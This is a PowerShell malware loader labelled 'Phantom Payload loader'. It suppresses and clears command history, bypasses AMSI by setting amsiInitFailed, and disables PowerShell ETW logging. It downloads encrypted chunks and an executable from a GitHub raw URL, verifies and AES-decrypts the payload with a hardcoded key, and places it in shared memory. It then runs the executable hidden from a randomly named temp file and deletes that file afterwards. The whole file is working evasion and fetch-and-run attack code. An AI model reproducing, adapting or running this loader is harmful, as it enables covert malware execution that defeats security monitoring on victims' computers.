#  <~ Phantom Payload loader (A3 â€” shared memory). ~>
$ErrorActionPreference = 'SilentlyContinue'

try {
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    $hp = (Get-PSReadLineOption).HistorySavePath
    if ($hp -and (Test-Path $hp)) { Clear-Content $hp -Force }
} catch {}

try {
    $am = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($am) {
        $f = $am.GetField('amsiInitFailed','NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
} catch {}

try {
    $et = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($et) {
        $ef = $et.GetField('etwProvider','NonPublic,Static')
        if ($ef) {
            $pr = $ef.GetValue($null)
            $en = $pr.GetType().GetField('m_enabled','NonPublic,Instance')
            if ($en) { $en.SetValue($pr, 0) }
        }
    }
} catch {}

$BaseUrl    = 'https://raw.githubusercontent.com/negadofoxzz-art/cfg-sync/refs/heads/main/'
$ChunkCount = 10
$KeyHex     = '6db02580be9a4fdfa1bd8da241b41f03b2cd2e36edf5ebef2feedeabb02a843c'
$MacUrl     = $BaseUrl + 'mac.b64'
$SlUrl      = $BaseUrl + 'sl.b64'

function HexBytes([string]$h) {
    $r = New-Object byte[] ($h.Length / 2)
    for ($i = 0; $i -lt $h.Length; $i += 2) {
        $r[$i / 2] = [Convert]::ToByte($h.Substring($i, 2), 16)
    }
    return ,$r
}

$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
$envParts = @()
$totalSize = 0
for ($i = 1; $i -le $ChunkCount; $i++) {
    $name = 'cfg-{0:D2}.txt' -f $i
    $b64 = $wc.DownloadString($BaseUrl + $name)
    $part = [Convert]::FromBase64String($b64.Trim())
    $envParts += ,$part
    $totalSize += $part.Length
}
$envelope = New-Object byte[] $totalSize
$off = 0
foreach ($p in $envParts) {
    [Buffer]::BlockCopy($p, 0, $envelope, $off, $p.Length)
    $off += $p.Length
}

$macB64 = $wc.DownloadString($MacUrl)
$macRef = [Convert]::FromBase64String($macB64.Trim())
$slB64  = $wc.DownloadString($SlUrl)
$slExe  = [Convert]::FromBase64String($slB64.Trim())
$wc.Dispose()

$iv = New-Object byte[] 16
$ct = New-Object byte[] ($envelope.Length - 16)
[Buffer]::BlockCopy($envelope, 0,  $iv, 0, 16)
[Buffer]::BlockCopy($envelope, 16, $ct, 0, $ct.Length)

$key = HexBytes $KeyHex
$hm  = [System.Security.Cryptography.HMACSHA256]::new($key)
$macCur = $hm.ComputeHash($ct)
$hm.Dispose()
$ok = $true
if ($macCur.Length -ne $macRef.Length) { $ok = $false }
else {
    $xor = 0
    for ($i = 0; $i -lt $macCur.Length; $i++) { $xor = $xor -bor ($macCur[$i] -bxor $macRef[$i]) }
    if ($xor -ne 0) { $ok = $false }
}
if (-not $ok) { Write-Host 'hmac fail'; return }

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV  = $iv
$dec = $aes.CreateDecryptor()
$ms  = New-Object System.IO.MemoryStream
$cs  = New-Object System.Security.Cryptography.CryptoStream($ms, $dec, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($ct, 0, $ct.Length)
$cs.FlushFinalBlock()
$fivem = $ms.ToArray()
$cs.Dispose(); $ms.Dispose(); $dec.Dispose(); $aes.Dispose()
[Array]::Clear($key, 0, $key.Length)
[Array]::Clear($ct,  0, $ct.Length)
[Array]::Clear($iv,  0, $iv.Length)
$envelope = $null; $envParts = $null

$ext  = ([IO.Path]::GetRandomFileName()) -replace '\..*$',''
$exePath = [IO.Path]::Combine([IO.Path]::GetTempPath(), "ms$ext.exe")
[IO.File]::WriteAllBytes($exePath, $slExe)
[Array]::Clear($slExe, 0, $slExe.Length)

$mapName = "Local\PH_$([Guid]::NewGuid().ToString('N'))"
$mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew($mapName, $fivem.Length)
$view = $mmf.CreateViewAccessor(0, $fivem.Length, [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::Write)
$view.WriteArray(0, $fivem, 0, $fivem.Length)
$view.Flush()
$view.Dispose()

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName               = $exePath
$psi.Arguments              = "`"$mapName`" $($fivem.Length)"
$psi.UseShellExecute        = $false
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError  = $true
$psi.CreateNoWindow         = $true
$psi.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden

try {
    $p = [System.Diagnostics.Process]::Start($psi)
    $stderrAll = $p.StandardError.ReadToEnd()
    $stdoutAll = $p.StandardOutput.ReadToEnd()
    [void]$p.WaitForExit(15000)
    Write-Host "---SL EXIT=$($p.ExitCode)---"
    Write-Host "---STDERR---"
    Write-Host $stderrAll
    Write-Host "---STDOUT---"
    Write-Host $stdoutAll
    Write-Host "---END---"
} catch {
    Write-Host "SPAWN EXCEPTION: $_"
}

[Array]::Clear($fivem, 0, $fivem.Length)
$mmf.Dispose()
Start-Sleep -Milliseconds 500
Remove-Item $exePath -Force -EA Ignore
